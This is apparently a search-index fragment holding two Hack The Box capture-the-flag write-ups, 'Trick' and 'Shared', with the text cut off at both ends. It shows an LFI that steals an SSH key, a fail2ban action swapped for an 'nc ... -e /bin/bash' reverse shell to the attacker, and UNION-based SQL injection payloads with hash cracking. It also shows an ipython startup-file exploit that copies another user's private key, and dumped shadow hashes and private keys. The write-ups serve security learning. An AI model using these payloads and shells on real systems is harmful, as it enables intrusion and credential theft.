127.0.0.1\ntrick.htb.      604800  IN  AAAA    ::1\npreprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.\ntrick.htb.      604800  IN  SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800\n\nReceived 192 bytes from 10.129.37.48#53 in 35 ms\n\n\n\n\n\n\n### Step 2 On preprod-payroll.trick.htb we find a login prompt, as seen in below picture. \n\n\n\n\n### Step 3\n\n\nI firmly believe we’ve milked this resource and need to find a new source, so lets continue fuzzing for more vhosts.\n\n\nbash ➜  trick ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://trick.htb -H \"Host: preprod-FUZZ.trick.htb\" -fs 5480 [... snip ...] marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179] payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267]\n\n\nThe marketing site seems to be similar to payroll, where the data is presented through the page url parameter. Trying some standard Burp LFI lists and we get one match! We’re able to read /etc/hosts\n\n\n\n\n\nSend the request to the repeater and grab /etc/passwd to find valid users.\n\n\n\n\n\nUser michael seems like our guy! Note that he has UID 1001, and 1000 is no where to be seen - interesting! Look if michael has an id_rsa we can steal.\n\n\nRequest:\n\n\nResponse: ```bash HTTP/1.1 200 OK Server: nginx/1.14.2 Date: Mon, 20 Jun 2022 19:54:38 GMT Content-Type: text/html; charset=UTF-8 Connection: close Content-Length: 1823\n\n\n—–BEGIN OPENSSH PRIVATE KEY—– b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+ 4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/ Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4 1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0 +93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6 IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/ KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0 fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS 3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+ IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ== —–END OPENSSH PRIVATE KEY—– ```\n\n\nLogin and grab user.txt: ```bash ➜ trick ssh michael@10.129.37.48 -i michael-id_rsa Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64\n\n\nThe programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.\n\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. michael@trick:~$ id && hostname && cat user.txt uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security) trick 6c4275462016ada1fe28be5396666965 ```\n\n\nNOTE: Michael is a part of group security\n\n\n\n\n\n\nROOT\n\nStep 1\nEnumerate the user space and see if we find anything sensitive.\nSudo -l:\nmichael@trick:~$ sudo -l\nMatching Defaults entries for michael on trick:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser michael may run the following commands on trick:\n    (root) NOPASSWD: /etc/init.d/fail2ban restart\nDB Password:\nmichael@trick:/var/www/payroll$ cat db_connect.php\n&lt;?php \n\n$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die(\"Could not connect to mysql\".mysqli_error($con));\nLets start look into fail2ban. Looking in the directory we see that action.d is owned by group securtiy, which michael is part of - awesome!\nmichael@trick:/etc/fail2ban$ ls -al\ntotal 76\ndrwxr-xr-x   6 root root      4096 Jun 20 22:09 .\ndrwxr-xr-x 126 root root     12288 Jun 20 21:59 ..\ndrwxrwx---   2 root security  4096 Jun 20 22:09 action.d\n-rw-r--r--   1 root root      2334 Jun 20 22:09 fail2ban.conf\ndrwxr-xr-x   2 root root      4096 Jun 20 22:09 fail2ban.d\ndrwxr-xr-x   3 root root      4096 Jun 20 22:09 filter.d\n-rw-r--r--   1 root root     22908 Jun 20 22:09 jail.conf\ndrwxr-xr-x   2 root root      4096 Jun 20 22:09 jail.d\n-rw-r--r--   1 root root       645 Jun 20 22:09 paths-arch.conf\n-rw-r--r--   1 root root      2827 Jun 20 22:09 paths-common.conf\n-rw-r--r--   1 root root       573 Jun 20 22:09 paths-debian.conf\n-rw-r--r--   1 root root       738 Jun 20 22:09 paths-opensuse.conf\nThe services using fail2ban is located in directory jail.d:\nmichael@trick:/etc/fail2ban$ ls -al jail.d\ntotal 12\ndrwxr-xr-x 2 root root 4096 Jun 20 22:12 .\ndrwxr-xr-x 6 root root 4096 Jun 20 22:12 ..\n-rw-r--r-- 1 root root   22 Jun 20 22:12 defaults-debian.conf\n\nmichael@trick:/etc/fail2ban$ cat jail.d/defaults-debian.conf \n[sshd]\nenabled = true\nSince there are no more options than just “ssh”, this means that default values from jail.conf will be used:\nmichael@trick:/etc/fail2ban$ less jail.conf \n[DEFAULT]\n\n[... snip ...]\n\n# \"bantime\" is the number of seconds that a host is banned.\nbantime  = 10s\n\n# A host is banned if it has generated \"maxretry\" during the last \"findtime\"\n# seconds.\nfindtime  = 10s\n\n# \"maxretry\" is the number of failures before a host get banned.\nmaxretry = 5\nOur group, security, owns action.d however that doesn’t make us able to edit the config file. BUT we can delete the original file and replace it with a custom malicious one. The service needs to be restarted for any new actions to take place, hence we’re able to run the command sudo /etc/init.d/fail2ban restart as user michael.\nDefault Action:\nmichael@trick:/etc/fail2ban$ cat /etc/fail2ban/action.d/iptables-multiport.conf\n[... snip ...]\nactionban = &lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;\nMalicious Action:\nmichael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf /tmp/\nmichael@trick:/etc/fail2ban/action.d$ cat /tmp/iptables-multiport.conf\n[... snip ...]\nactionban = /usr/bin/nc 10.10.15.1 4488 -e /bin/bash\nDelete the original file, copy over the malicious, trigger the ban with hydra and get the reverse shell as root.\nmichael@trick:/etc/fail2ban$ rm action.d/iptables-multiport.conf\nrm: remove write-protected regular file 'action.d/iptables-multiport.conf'? y\nmichael@trick:/etc/fail2ban$ cp /tmp/iptables-multiport.conf action.d/iptables-multiport.conf\nmichael@trick:/etc/fail2ban$ sudo /etc/init.d/fail2ban restart\n[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.\n➜  trick hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://10.129.37.48 -vV\n➜  trick nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.15.1] from (UNKNOWN) [10.129.37.48] 38994\nid \nuid=0(root) gid=0(root) groups=0(root)\n\ncat /root/root.txt\n395ca4e650fa0df53f1428253feb8b57\n\ncat /etc/shadow\nroot:$6$lbBzS2rUUVRa6Erd$u2u317eVZBZgdCrT2HViYv.69vxazyKjAuVETHTpTpD42H0RDPQIbsCHwPdKqBQphI/FOmpEt3lgD9QBsu6nU1:19104:0:99999:7:::\nmichael:$6$SPev7eFL5z0aKFf0$5iLTl9egsGGePEPUnNJlFyw8HHvTwqVC3/THKzW2YD5ZPnbkN7pSOeOkXe9uiUHfOJegJdYT0j3Z9pz.FSX2y0:19104:0:99999:7:::\n\ncat /root/.ssh/id_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAoSBXc6x1gauygp8zl8Y13QXTwj633MsMv/0YsBzmGiHb1xBadkGC\n6a0abDxM4UycoYN82sT7N732cJqL9mWK7ZeGPQX4+RHD0fQnVQY3KCYak7RxQQtilsErhG\nVgovwAtnbaKA+tlfsO7IlD3Mv6lbJ/ElD9drwhJOVdEf4IL+8SstVgd0AehVQgnLXd58MK\n7tuKX+a/+eBBjzfpA6hWIzTT3koLnMoTWe5uCuhIJiaBUQyvrBQ1C/M4E7rnHw6Rgh9x9d\n1LPInu0NMxbw0LAuFaQRcz3ewzEt8M2d639vedwahK5MyuTQS/ZTt33yjoas40kv+NZ5Y0\n5vVeP6XxcwAAA8jXOo441zqOOAAAAAdzc2gtcnNhAAABAQChIFdzrHWBq7KCnzOXxjXdBd\nPCPrfcywy//RiwHOYaIdvXEFp2QYLprRpsPEzhTJyhg3zaxPs3vfZwmov2ZYrtl4Y9Bfj5\nEcPR9CdVBjcoJhqTtHFBC2KWwSuEZWCi/AC2dtooD62V+w7siUPcy/qVsn8SUP12vCEk5V\n0R/ggv7xKy1WB3QB6FVCCctd3nwwru24pf5r/54EGPN+kDqFYjNNPeSgucyhNZ7m4K6Egm\nJoFRDK+sFDUL8zgTuucfDpGCH3H13Us8ie7Q0zFvDQsC4VpBFzPd7DMS3wzZ3rf2953BqE\nrkzK5NBL9lO3ffKOhqzjSS/41nljTm9V4/pfFzAAAAAwEAAQAAAQEAkxF9ITUZ8GjywC1m\nHzOpOHu4JIWwtxSTJ65x2VYXZWTgT7Y6i9QSFQ6OnpqPpdmS4g2tadYAY4m9plw6QoW+wE\nzdF1gbP+RKM5pCSGYq9DeLbKR392HX9DiPawJJqZqRX/qt94EP9WS544cK7T82E2tgdyx7\nnePr8Mx2HhUcDfsbxQlRbM9oKqIBQ0v9GdBotvi+Ri/IQfpEpmS64cU450/DlrwQ358MU9\ni8so0KlnAHLYxgzhEzPjPehaRShcsRdhasw1/xVKk7PoBvXzz9r+Ywo5b2htiYzqxt5N5i\nE8UOrUeYb7G21QjuhKB9KerukyGeHdBPjqvYuYjTwf2dUQAAAIEAnSUxZdekVLY0IoYPBF\nDBDIMkk97Kq2v8H51L9Q0rKBs79x4ZaV56LfMnTxuAxwnUMUauyPeGZFDgVsFwg0JK+vbR\nKj9idBoMTOuDdfTE4IJtT3tEKClzFS9YSrYdQ78OUu8Kip3p5OuWfrzTuhRCKZ2cwd86WU\nghEBWtHhn/2RsAAACBANHocGFZWWM1DGtA3ZXiytuJLh7D55NUPk7jumm+qcF7UUiKaRHA\nQnQ44oxHssJbkGi4S3tvfSlXFtNboQCt3q5Wgc3wl4S+sBGoq1xsZuXAz/3QX2AjXSpN/S\nPkO+h4pk25aAFjGmAMMoH1Ty9v2X8ahYRY5EV8Y/LRcMF32Z5rAAAAgQDEgb1hc85TS0Wz\npmGTto+ok3eI/10wxgbZXtdki7Jn1npNI5S7lh0r76jqEn5edcIYlwcUV+b6dCucDUhUHl\n7VT/uoy+BKbanLzM809KCnuLCM7LDISk4N/S79xiuFlrk11MrV2qaxZANiYEkOd1jKRGPi\nUDRYRn2lPX7WiLyrGQAAAApyb290QHRyaWNrAQIDBAUGBw==\n-----END OPENSSH PRIVATE KEY-----"
  },
  {
    "objectID": "posts/2022-08-25-htb-writeup-shared/2022-08-25-htb-writeup-shared.html",
    "href": "posts/2022-08-25-htb-writeup-shared/2022-08-25-htb-writeup-shared.html",
    "title": "Shared - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\n➜  /htb nmap -Pn -n -p- 10.10.11.172\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\n\n➜  /htb nmap -Pn -n -p22,80,443 -sCV 10.10.11.172\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)\n|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)\n|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)\n80/tcp  open  http     nginx 1.18.0\n|_http-title: Did not follow redirect to http://shared.htb\n|_http-server-header: nginx/1.18.0\n443/tcp open  ssl/http nginx 1.18.0\n|_http-title: Did not follow redirect to https://shared.htb\n| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US\n| Not valid before: 2022-03-20T13:37:14\n|_Not valid after:  2042-03-15T13:37:14\n| tls-nextprotoneg: \n|   h2\n|_  http/1.1\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|   h2\n|_  http/1.1\n|_http-server-header: nginx/1.18.0\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nPort 80 is redirecting to http://shared.htb and from there to https://shared.htb\n➜  /htb curl -kvs -L http://10.10.11.172\n*   Trying 10.10.11.172:80...\n* Connected to 10.10.11.172 (10.10.11.172) port 80 (#0)\n&gt; GET / HTTP/1.1\n&gt; Host: 10.10.11.172\n&lt; HTTP/1.1 301 Moved Permanently\n&lt; Server: nginx/1.18.0\n&lt; Location: http://shared.htb\n&lt; \n&gt; GET / HTTP/1.1\n&gt; Host: shared.htb\n&lt; HTTP/1.1 301 Moved Permanently\n&lt; Server: nginx/1.18.0\n&lt; Location: https://shared.htb/\n* Clear auth, redirects to port from 80 to 443\n* Issue another request to this URL: 'https://shared.htb/'\n➜  webanalyze ./webanalyze -host https://shared.htb\nhttps://shared.htb (0.7s):\n    Nginx, 1.18.0 (Web servers, Reverse proxies)\n    PHP,  (Programming languages)\n\nNew checkout process “be sure to take a look on it!” - is that a hint maybe? Pressing “checkout” takes you to https://checkout.shared.htb, add it to /etc/hosts. In the footer of the page we find that the site is built using PrestaShop. Googling about PrestaShop we find some older and newer vulns, but in particular one from 2022 where the module blockwishlist is vulnerable.\nThe vulnerability is executed with help of SQL Injection, so lets look for a vector.\nAll items we add from the store are processed and saved in the cookie variable custom_cart, which is URL encoded and sticks out. Decode the data and playing around I find that the value field is reflected in the response. \nPlaying around with SQLi in the product ID field I find that testing 'ORDER BY 4-- - returns “Not Found”, while 'ORDER BY 3-- - still returns the ID. \n\nFurther testing and I find:\n## Request\ncustom_cart={\"4HAR4XDK'OR 1=1 UNION SELECT @@version,2,3-- -\":\"1\",\"2E6E8GXJ\":\"1\"}\n\n## Response\n53GG2EF8\nA new ID, we’re getting close to something! Note that we get the same response no matter if @@version is at column 1,2 or 3. Since 4HAR4XDK is a valid ID and will therefore return true, remove it and use an invalid ID instead.\n## Request\ncustom_cart={\"sqlihere'UNION SELECT 1,@@version,3-- -\":\"1\",\"2E6E8GXJ\":\"1\"}\n\n## Response\n10.5.15-MariaDB-0+deb11u1\nWe got outselves a foothold!\n\n\nStep 2\nEnumerate the database manually go gain usefull information.\n## DATABSE\nrequest: custom_cart={\"sqlihere'UNION SELECT 1,database(),3-- -\":\"1\",\"2E6E8GXJ\":\"1\"}\nresponse: checkout\n\n## USER\nrequest: custom_cart={\"sqlihere'UNION SELECT 1,user(),3-- -\":\"1\",\"2E6E8GXJ\":\"1\"}\nresponse: checkout@localhost\n\n## TABLES\nrequest: custom_cart={\"sqlihere'UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -\":\"1\",\"2E6E8GXJ\":\"1\"}\nresponse: ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENABLED_ROLES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEYWORDS,KEY_CACHES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,SQL_FUNCTIONS,SYSTEM_VARIABLES,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,CLIENT_STATISTICS,INDEX_STATISTICS,INNODB_SYS_DATAFILES,GEOMETRY_COLUMNS,INNODB_SYS_TABLESTATS,SPATIAL_REF_SYS,INNODB_BUFFER_PAGE,INNODB_TRX,INNODB_CMP_PER_INDEX,INNODB_METRICS,INNODB_LOCK_WAITS,INNODB_CMP,THREAD_POOL_WAITS,INNODB_CMP_RESET,THREAD_POOL_QUEUES,TABLE_STATISTICS,INNODB_SYS_FIELDS,INNODB_BUFFER_PAGE_LRU,INNODB_LOCKS,INNODB_FT_INDEX_TABLE,INNODB_CMPMEM,THREAD_POOL_GROUPS,INNODB_CMP_PER_INDEX_RESET,INNODB_SYS_FOREIGN_COLS,INNODB_FT_INDEX_CACHE,INNODB_BUFFER_POOL_STATS,INNODB_FT_BEING_DELETED,INNODB_SYS_FOREIGN,INNODB_CMPMEM_RESET,INNODB_FT_DEFAULT_STOPWORD,INNODB_SYS_TABLES,INNODB_SYS_COLUMNS,INNODB_FT_CONFIG,USER_STATISTICS,INNODB_SYS_TABLESPACES,INNODB_SYS_VIRTUAL,INNODB_SYS_INDEXES,INNODB_SYS_SEMAPHORE_WAITS,INNODB_MUTEXES,user_variables,INNODB_TABLESPACES_ENCRYPTION,INNODB_FT_DELETED,THREAD_POOL_STATS,user,product\n\n## COLUMNS\nrequest: custom_cart={\"sqlihere'UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name = 'user'-- -\":\"1\",\"2E6E8GXJ\":\"1\"}\nresponse: id,username,password\n\n## EXTRACT DATA\nrequest: custom_cart={\"sqlihere'UNION SELECT 1,group_concat(username,0x3a,password),3 FROM user-- -\":\"1\",\"2E6E8GXJ\":\"1\"}\nresponse: james_mason:fc895d4eddc2fc12f995e18c865cf273\nWrite that user + hash to file and crack with hashcat.\n➜  shared cat james_mason.hash                                                 \njames_mason:fc895d4eddc2fc12f995e18c865cf273\n\n➜  shared hashcat -a0 -m0 james_mason.hash /usr/share/wordlists/rockyou.txt --user\n\n[... snip ...]\nfc895d4eddc2fc12f995e18c865cf273:Soleil101                \nSession..........: hashcat\nStatus...........: Cracked\nTest credentials over SSH:\n➜  shared ssh james_mason@shared.htb\njames_mason@shared.htb password: Soleil101\n\njames_mason@shared:~$ id && cat user.txt\nuid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)\ncat: user.txt: No such file or directory\nuser.txt is sadly not in the possesion of james’, so it looks like we need to move laterally. From id we can see that james have a non-standard group developer, lets dig deeper into this.\n\n\nStep 3\nIn /opt we find the directory scripts_review which is empty. The directory is owned by developer so we can post scripts/files here, however they are deleted after a short while.\njames_mason@shared:/opt$ ls -al\ndrwxrwx---  2 root developer 4096 Jul 14 13:46 scripts_review\n\njames_mason@shared:/opt/scripts_review$ touch test\njames_mason@shared:/opt/scripts_review$ ls -al\ntotal 8\ndrwxrwx--- 2 root developer 4096 Aug 25 06:53 .\ndrwxr-xr-x 3 root root      4096 Jul 14 13:46 ..\n-rw-r--r-- 1 james_mason james_mason    0 Aug 25 06:53 test\n\njames_mason@shared:/opt/scripts_review$ ls -al\ntotal 8\ndrwxrwx--- 2 root developer 4096 Aug 25 06:53 .\ndrwxr-xr-x 3 root root      4096 Jul 14 13:46 ..\nUpload pspy64 to see if we can make sense why the files are deleted.\njames_mason@shared:/dev/shm$ wget http://10.10.14.4/pspy64\njames_mason@shared:/dev/shm$ chmod +x pspy64 \njames_mason@shared:/dev/shm$ ./pspy64\n[... snip ...]\n2022/08/25 06:58:01 CMD: UID=0    PID=6809   | /usr/sbin/CRON -f \n2022/08/25 06:58:01 CMD: UID=1001 PID=6811   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython \n2022/08/25 06:58:01 CMD: UID=0    PID=6813   | /usr/sbin/CRON -f \n2022/08/25 06:58:01 CMD: UID=1001 PID=6812   | /usr/bin/pkill ipython \n2022/08/25 06:58:01 CMD: UID=0    PID=6814   | /bin/bash /root/c.sh \n2022/08/25 06:58:01 CMD: UID=0    PID=6815   | sleep 5 \n2022/08/25 06:58:01 CMD: UID=1001 PID=6816   | /usr/bin/python3 /usr/local/bin/ipython \n2022/08/25 06:58:06 CMD: UID=0    PID=6818   | rm -rf /opt/scripts_review/* \n2022/08/25 06:58:06 CMD: UID=0    PID=6819   | /bin/bash /root/c.sh \n2022/08/25 06:58:06 CMD: UID=0    PID=6821   | \n2022/08/25 06:58:06 CMD: UID=0    PID=6820   | /bin/bash /root/c.sh \n2022/08/25 06:58:06 CMD: UID=0    PID=6822   | /bin/bash /root/c.sh \n2022/08/25 06:58:06 CMD: UID=0    PID=6825   | (s-server) \n2022/08/25 06:58:06 CMD: UID=0    PID=8501   | perl -ne s/\\((\\d+)\\)/print \" $1\"/ge \n2022/08/25 06:58:06 CMD: UID=0    PID=8502   | pidof redis-server \n2022/08/25 06:58:06 CMD: UID=0    PID=8505   | /sbin/init \nUID 1001 (dan_smith) is running a job every minute where he changes into the directory /opt/scripts_review, and when there starts ipython. Reading about ipython we find that there’s a vulnerability that allows users to run code as another user, if they know where (which dir) the victim starts ipython.\nWith this information steal dan_smith’s id_rsa\njames_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default\njames_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default/startup\njames_mason@shared:/opt/scripts_review$ echo 'import os; os.system(\"cp /home/dan_smith/.ssh/id_rsa /dev/shm/dan-id_rsa && chmod 777 /dev/shm/dan-id_rsa\")' &gt; profile_default/startup/exploit.py\njames_mason@shared:/opt/scripts_review$ chmod +x profile_default/startup/exploit.py\n\njames_mason@shared:/opt/scripts_review$ ls -al /dev/shm/\ntotal 3012\ndrwxrwxrwt  2 root        root             80 Aug 25 07:42 .\ndrwxr-xr-x 17 root        root           3080 Aug 25 03:03 ..\n-rwxrwxrwx  1 dan_smith   developer      2602 Aug 25 07:47 dan-id_rsa\n\njames_mason@shared:/opt/scripts_review$ cat /dev/shm/dan-id_rsa \n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\nWrite to file, login and grab user.txt.\n➜  shared vim dan-id_rsa\n➜  shared chmod 400 dan-id_rsa \n➜  shared ssh dan_smith@shared.htb -i dan-id_rsa \n\ndan_smith@shared:~$ id && cat user.txt\nuid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)\nac1d7c930a51968f97efe55963ecfe62\n\n\n\n\nROOT\n\nStep 